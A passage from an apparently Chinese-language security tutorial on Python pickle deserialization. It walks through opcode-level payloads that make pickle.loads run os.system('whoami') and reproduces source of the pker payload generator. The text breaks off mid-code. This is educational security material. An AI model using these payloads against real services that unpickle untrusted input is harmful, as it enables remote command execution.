+<li><code>i os\n system\n</code> → <code>INST</code>：老式“构造实例”指令，<strong>会把栈上从 <code>MARK</code> 开始的元素作为参数</strong>，调用 <strong>指定模块名与对象名</strong> 指向的可调用对象。<br>这实际上会调用 <code>os.system(&#39;whoami&#39;)</code>，虽然这个指令名看起来像“实例化类”，但底层就是<strong>调用可调用对象</strong>（当年主要用于旧式类）。</li>
+<li><code>.</code> → 返回。</li>
+</ul>
+<p>对应的栈变化为：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[]  </span><br><span class="line">→ [ ⟂ ]                                        <span class="comment"># (</span></span><br><span class="line">→ [ ⟂, <span class="string">&#x27;whoami&#x27;</span> ]                              <span class="comment"># S&#x27;whoami&#x27;</span></span><br><span class="line">→ [ os.system(<span class="string">&#x27;whoami&#x27;</span>) ]                      <span class="comment"># i os system</span></span><br><span class="line">→ <span class="keyword">return</span> result_of_system                      <span class="comment"># .</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="OBJ-o-路径"><a href="#OBJ-o-路径" class="headerlink" title="OBJ (o) 路径"></a><code>OBJ (o)</code> 路径</h4><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>执行过程为：</p>
+<ul>
+<li><code>(</code> 压入 <code>MARK</code></li>
+<li><code>c os\n system\n</code> → 把 <code>os.system</code> 压栈</li>
+<li><code>S&#39;whoami&#39;\n</code> → 压入参数</li>
+<li><code>o</code> → <code>OBJ</code>：使用 <code>MARK</code> 后的内容作为参数<strong>调用</strong>栈中的“类&#x2F;可调用对象”，得到结果压栈（历史上用于“构造类实例”，本质还是“调用”）。</li>
+<li><code>.</code> → 返回</li>
+</ul>
+<p>对应的栈变化为：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[]  </span><br><span class="line">→ [ ⟂ ]                                        <span class="comment"># (</span></span><br><span class="line">→ [ ⟂, os.system ]                             <span class="comment"># c os system</span></span><br><span class="line">→ [ ⟂, os.system, <span class="string">&#x27;whoami&#x27;</span> ]                   <span class="comment"># S&#x27;whoami&#x27;</span></span><br><span class="line">→ [ os.system(<span class="string">&#x27;whoami&#x27;</span>) ]                      <span class="comment"># o (OBJ)</span></span><br><span class="line">→ <span class="keyword">return</span> result_of_system                      <span class="comment"># .</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Student</span></span><br><span class="line"><span class="string">(S&#x27;XiaoMing&#x27;</span></span><br><span class="line"><span class="string">S&#x27;20&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a = pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name, a.age)  <span class="comment"># XiaoMing 20</span></span><br></pre></td></tr></table></figure></div>
+
+<p>执行过程为：</p>
+<ul>
+<li><code>GLOBAL &quot;__main__&quot;\n &quot;Student&quot;\n</code> → 压入 <code>Student</code> 构造器；</li>
+<li><code>(</code> + <code>S&#39;XiaoMing&#39;</code> + <code>S&#39;20&#39;</code> + <code>t</code> → 参数元组 <code>(&#39;XiaoMing&#39;, &#39;20&#39;)</code>；</li>
+<li><code>R</code> → 调用 <code>Student(&#39;XiaoMing&#39;, &#39;20&#39;)</code>；</li>
+<li><code>.</code> → 返回实例。</li>
+</ul>
+<p>对应的栈变化为：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[]  </span><br><span class="line">→ [ Student ]                                  <span class="comment"># c__main__ Student</span></span><br><span class="line">→ [ Student, ⟂ ]                               <span class="comment"># (</span></span><br><span class="line">→ [ Student, ⟂, <span class="string">&#x27;XiaoMing&#x27;</span> ]                   <span class="comment"># S&#x27;XiaoMing&#x27;</span></span><br><span class="line">→ [ Student, ⟂, <span class="string">&#x27;XiaoMing&#x27;</span>, <span class="string">&#x27;20&#x27;</span> ]             <span class="comment"># S&#x27;20&#x27;</span></span><br><span class="line">→ [ Student, (<span class="string">&#x27;XiaoMing&#x27;</span>, <span class="string">&#x27;20&#x27;</span>) ]               <span class="comment"># t (TUPLE)</span></span><br><span class="line">→ [ Student(<span class="string">&#x27;XiaoMing&#x27;</span>, <span class="string">&#x27;20&#x27;</span>) ]                 <span class="comment"># R (REDUCE)</span></span><br><span class="line">→ <span class="keyword">return</span> student_instance                       <span class="comment"># .</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pker-编写字节码"><a href="#pker-编写字节码" class="headerlink" title="pker 编写字节码"></a>pker 编写字节码</h2><p><a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/pker/tree/master"><code>pker</code></a> 是一个安全研究工具，可将<strong>受限子集的 Python 源码</strong>直接转换为 <strong>Pickle 协议 0（文本）指令串</strong>。<br> 它主要用于构造 Pickle 反序列化的 payload，在安全测试、CTF 中快速生成协议 0 的可执行 pickle 数据，而无需手写复杂的 opcode。</p>
+<h3 id="工具代码"><a href="#工具代码" class="headerlink" title="工具代码"></a>工具代码</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内置“宏”集合：解析到这些标识符时，进入专门的宏翻译逻辑</span></span><br><span class="line">BUILTIN_MACROS = (</span><br><span class="line">    <span class="string">&#x27;GLOBAL&#x27;</span>,  <span class="comment"># 生成 GLOBAL opcode：c&#123;module&#125;\n&#123;name&#125;\n</span></span><br><span class="line">    <span class="string">&#x27;INST&#x27;</span>,  <span class="comment"># 生成 INST opcode（老式构造）</span></span><br><span class="line">    <span class="string">&#x27;OBJ&#x27;</span>,  <span class="comment"># 生成 OBJ opcode：调用可调用对象</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 基础工具：AST -&gt; Python 值（或保留节点） ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_is_num_node</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;兼容旧版 ast.Num / 新版 ast.Constant(int/float/bool)&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(node, ast.Num) <span class="keyword">or</span> (<span class="built_in">isinstance</span>(node, ast.Constant) <span class="keyword">and</span> <span class="built_in">isinstance</span>(node.value, (<span class="built_in">int</span>, <span class="built_in">float</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_is_str_node</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;兼容旧版 ast.Str / 新版 ast.Constant(str)&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isinstance</span>(node, ast.Str) <span class="keyword">or</span> (<span class="built_in">isinstance</span>(node, ast.Constant) <span class="keyword">and</span> <span class="built_in">isinstance</span>(node.value, <span class="built_in">str</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_value</span>(<span class="params">node</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将 AST 节点抽取为 Python 的原生值（int/float/str/list/tuple/dict/...）。</span></span><br><span class="line"><span class="string">    不可直接抽取（如 ast.Call / ast.Name）则原样返回，由后续生成器处理。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 数字（int/float）</span></span><br><span class="line">    <span class="keyword">if</span> _is_num_node(node):</span><br><span class="line">        <span class="keyword">return</span> node.n <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Num) <span class="keyword">else</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字符串</span></span><br><span class="line">    <span class="keyword">if</span> _is_str_node(node):</span><br><span class="line">        <span class="keyword">return</span> node.s <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Str) <span class="keyword">else</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># None / True / False / 其他 literal</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Constant):</span><br><span class="line">        <span class="keyword">return</span> node.value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 列表</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.<span class="type">List</span>):</span><br><span class="line">        <span class="keyword">return</span> [extract_value(elt) <span class="keyword">for</span> elt <span class="keyword">in</span> node.elts]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 元组</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.<span class="type">Tuple</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(extract_value(elt) <span class="keyword">for</span> elt <span class="keyword">in</span> node.elts)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字典（修复：用 zip 一一配对）</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.<span class="type">Dict</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            extract_value(k): extract_value(v)</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">zip</span>(node.keys, node.values)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读下标不支持，给出替代建议</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Subscript):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Subscript read like x[&#x27;k&#x27;] is not supported. &quot;</span></span><br><span class="line">                        <span class="string">&quot;Use a method call form (e.g., dict.get(x, &#x27;k&#x27;) via calls) &quot;</span></span><br><span class="line">                        <span class="string">&quot;or rewrite to a supported sequence (e.g., use SETITEM-only tricks).&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他类型（如 ast.Call, ast.Name, ast.Attribute 等）：保留节点对象</span></span><br><span class="line">    <span class="keyword">return</span> node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== Python 值/节点 -&gt; 协议0 文本指令 ==========</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_basic_type</span>(<span class="params">v</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将基础值或部分 AST 节点翻译为 protocol 0 文本指令片段。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> cons_str(v)  <span class="comment"># S&#x27;...&#x27;\n</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, (<span class="built_in">int</span>, <span class="built_in">float</span>)):</span><br><span class="line">        <span class="keyword">return</span> cons_num(v)  <span class="comment"># I...\n / F...\n</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">list</span>):</span><br><span class="line">        <span class="keyword">return</span> cons_lst(v)  <span class="comment"># ( ... l</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">tuple</span>):</span><br><span class="line">        <span class="keyword">return</span> cons_tpl(v)  <span class="comment"># ( ... t</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">return</span> cons_dct(v)  <span class="comment"># ( k v k v ... d</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 兼容“已经是 Python None”的情况（非 AST 节点）</span></span><br><span class="line">    <span class="keyword">if</span> v <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;N&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 还未抽取/需要递归处理的 AST 节点</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, ast.Call):</span><br><span class="line">        <span class="keyword">return</span> cons_invoke(v)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, ast.Name):</span><br><span class="line">        <span class="keyword">return</span> cons_defined_var(v.<span class="built_in">id</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, ast.Constant) <span class="keyword">and</span> v.value <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;N&#x27;</span>  <span class="comment"># None -&gt; N</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 兜底：一般不会走到</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_str</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    字符串常量：S&#x27;...&#x27;\n</span></span><br><span class="line"><span class="string">    协议0要求使用单引号包裹并进行必要转义。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    s = s.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;S&#x27;<span class="subst">&#123;s&#125;</span>&#x27;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_num</span>(<span class="params">n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    数字常量（协议0）：</span></span><br><span class="line"><span class="string">      int   -&gt; I&#123;int&#125;\n</span></span><br><span class="line"><span class="string">      float -&gt; F&#123;float&#125;\n  （按 str(n) 输出，避免科学计数法差异）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(n, <span class="built_in">int</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;I<span class="subst">&#123;n&#125;</span>\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(n, <span class="built_in">float</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;F<span class="subst">&#123;n&#125;</span>\n&#x27;</span></span><br><span class="line">    <span class="keyword">raise</span> TypeError(<span class="string">f&#x27;cons_num only accepts int/float, got <span class="subst">&#123;<span class="built_in">type</span>(n).__name__&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_lst</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    列表：</span></span><br><span class="line"><span class="string">      &#x27;(&#x27; 打 MARK</span></span><br><span class="line"><span class="string">      依次 push 各元素</span></span><br><span class="line"><span class="string">      &#x27;l&#x27; 结束 -&gt; LIST</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    buf = [<span class="string">&#x27;(&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> lst:</span><br><span class="line">        buf.append(cons_basic_type(cell))</span><br><span class="line">    buf.append(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cons_tpl</span>(<span class="params">tpl</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    元组：</span></span><br><span class="line"><span class="string">      &#x27;(&#x27; 打 MARK</span></span><br><span class="line"><span class="string">      依次 push 各元素</span></span><br><span 